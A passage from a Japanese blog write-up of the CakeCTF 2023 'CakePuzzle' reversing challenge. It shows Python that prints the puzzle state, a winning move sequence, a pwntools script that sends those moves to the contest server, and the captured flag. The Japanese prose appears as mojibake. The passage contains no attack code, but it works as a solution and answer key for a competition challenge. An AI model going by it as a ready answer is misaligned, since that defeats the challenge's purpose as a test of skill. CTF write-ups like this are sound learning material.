        <span class=k>if</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
            <span class=n>counter</span> <span class=o>+=</span> <span class=mi>1</span>
            <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>10</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
            <span class=k>if</span> <span class=n>counter</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>show_state_slide</span><span class=p>():</span>
    <span class=n>sorted_index</span><span class=p>,</span> <span class=n>sorted_puzzle</span> <span class=o>=</span> <span class=n>puzzle_index</span><span class=p>()</span>
    <span class=n>state_puzzle</span><span class=p>(</span><span class=n>sorted_index</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>slide</span><span class=p>(</span><span class=n>vec</span><span class=p>):</span>
    <span class=n>vec_list</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>vec</span><span class=p>)</span>
    <span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>vec_list</span><span class=p>:</span>
        <span class=n>e</span><span class=p>(</span><span class=n>v</span><span class=p>)</span>
    <span class=n>show_state_slide</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>è§£ã„ãŸçµæœã€æ¬¡ã®ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã§ãƒ‘ã‚ºãƒ«ãŒè§£ã‘ã¾ã—ãŸã€‚<code>q</code>ãƒ¡ã‚½ãƒƒãƒ‰ã‹ã‚‰è¿”ã£ã¦ãã‚‹å€¤ãŒ0ã«ãªã‚‹ã“ã¨ã‚‚ç¢ºèªã§ãã¾ã—ãŸã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>slide</span><span class=p>(</span><span class=s2>&#34;RURDDRULLDRULULDRRUULLDRDRRDLLLUURDDLUUURDLURRDDRULDRULLDRRUULLDRDRULLURRDLDRULLURDLLU&#34;</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;q = </span><span class=si>{</span><span class=n>q</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</code></pre></td></tr></table>
</div>
</div><div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>vagrant@vagrant:~/repo/cakectf2023/rev/cakepuzzle$ python3 main.py
1146640091 1277362948 0002245791 1729795767 
1817593079 2146722439 1860814889 1557802610 
0000000000 1770948809 0870734415 1355570260 
0323584794 1405652852 0629508793 1928951512 

05 06 01 10 
12 15 13 09 
00 11 04 07 
02 08 03 14 
[2, 0, R]
&lt;Move&gt;R: 32, 36
...
[1, 0, U]
&lt;Move&gt;U: 16, 0
00 01 02 03 
04 05 06 07 
08 09 10 11 
12 13 14 15 
q = 0
</code></pre></td></tr></table>
</div>
</div><p>ã“ã®ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’é€ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ã¦ã€ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã™ã‚‹ã¨flagãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=kn>import</span> <span class=nn>time</span>

<span class=n>solver</span> <span class=o>=</span> <span class=s2>&#34;RURDDRULLDRULULDRRUULLDRDRRDLLLUURDDLUUURDLURRDDRULDRULLDRRUULLDRDRULLURRDLDRULLURDLLU&#34;</span>

<span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;others.2023.cakectf.com&#34;</span><span class=p>,</span> <span class=mi>14001</span><span class=p>)</span>

<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>solver</span><span class=p>)):</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>solver</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>solver</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s2>&#34;utf-8&#34;</span><span class=p>))</span>

<span class=nb>print</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>readline</span><span class=p>())</span>
</code></pre></td></tr></table>
</div>
</div><p>ã‚ˆã£ã¦flagã¯<code>CakeCTF{wh0_at3_a_missing_pi3c3_0f_a_cak3}</code>ã§ã™ã€‚</p>
<h2 id=çµ‚ã‚ã‚Šã«>çµ‚ã‚ã‚Šã«</h2>
<p>ä»Šã¾ã§ã®çŸ¥è­˜ã‚’å…¨ã¦æ´»ç”¨ã—ã¦å•é¡ŒãŒè§£ã‘ãŸã¨ãã¯ã‚„ã¯ã‚Šé¢ç™½ã„ãªã¨å‚åŠ ã—ã¦æ„Ÿã˜ã¾ã—ãŸã€‚
ç‰¹ã«ã€å­¦æ ¡ã®æˆæ¥­ã§ç¿’ã£ãŸã“ã¨ãŒæ´»ç”¨ã§ããŸæ™‚ã¯ã€å‹‰å¼·ã—ã¨ã„ã¦ã‚ˆã‹ã£ãŸã¨æ€ã†ã“ã¨ãŒå¤šã„ã§ã™ã€‚
è‡ªåˆ†ã§ã‚‚å¥½ããªã“ã¨ã‚’å‹‰å¼·ã—ã¦ã€é¢ç™½ã„ã¨æ„Ÿã˜ã‚Œã‚‹æ©Ÿä¼šã‚’å¢—ã‚„ã—ã¦ã„ããŸã„ã¨æ€ã„ã¾ã™ã€‚</p>
<p>æœ€å¾Œã«ã€ã“ã®CakeCTF2023ã®é‹å–¶ã‚’è¡Œã£ã¦ã„ãŸã ã„ãŸæ–¹ã€…ã€ã“ã®ã‚ˆã†ãªæ¥½ã—ã„å¤§ä¼šã‚’é–‹å‚¬ã—ã¦ã„ãŸã ãã‚ã‚ŠãŒã¨ã†ã”ã–ã„ã¾ã—ãŸã€‚</p>
</section>
<footer class=article-footer>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css integrity="sha256-J+iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s=" crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js integrity="sha256-InsNdER1b2xUewP+pKCUJpkhiqwHgqiPXDlIk7GzBu4=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-content--wrapper>
<h2 class=section-title>é–¢é€£ã™ã‚‹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„</h2>
<div class=related-content>
<div class="flex article-list--tile">
<article>
<a href=https://hiro-1219.github.io/blog/p/wanictf2023-writeup/>
<div class=article-details>
<h2 class=article-title>WaniCTF2023 WriteUp</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<footer class=site-footer>
<section class=copyright>
&copy;
2022 -
2023 ã‚„ã˜ã‚‹ã—ã®ãƒ–ãƒ­ã‚°
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
ãƒ†ãƒ¼ãƒ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.12.0>Stack</a></b> ã¯ <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> ã«ã‚ˆã£ã¦è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">ç›®æ¬¡</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li>
<ol>
<li><a href=#ã¯ã˜ã‚ã«>ã¯ã˜ã‚ã«</a></li>
</ol>
</li>
<li><a href=#web>web</a>
<ol>
<li><a href=#country-db-web-warmup>Country DB [web, warmup]</a></li>
<li><a href=#towfl-cheat-web>TOWFL [cheat, web]</a></li>
</ol>
</li>
<li><a href=#rev>rev</a>
<ol>
<li><a href=#nande-warmup-rev>nande [warmup, rev]</a></li>
<li><a href=#cakepuzzle-rev>CakePuzzle [rev]</a></li>
</ol>
</li>
<li><a href=#çµ‚ã‚ã‚Šã«>çµ‚ã‚ã‚Šã«</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://hiro-1219.github.io/blog/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>